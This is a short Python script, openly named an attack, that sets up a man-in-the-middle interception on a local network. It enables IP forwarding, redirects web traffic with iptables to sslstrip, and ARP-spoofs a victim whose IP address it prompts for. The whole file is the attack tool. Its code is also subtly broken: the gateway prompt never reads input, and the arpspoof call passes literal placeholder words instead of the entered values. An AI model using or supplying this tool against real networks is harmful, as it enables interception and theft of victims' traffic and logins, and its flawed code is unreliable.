#! /usr/bin/env python3
import os
import subprocess
def attack():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A PREROUTING -i eth1 -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
    subprocess.Popen(['sslstrip -p -l 10000'],shell=True)
    ip = input("Enter ip victim : ")
    gw = ("Enter GateWay :  ")
    os.system("arpspoof -i eth0 -t ip gw")
    os.system("tail -f sslstrip.log")


if __name__ == '__main__':
    attack()
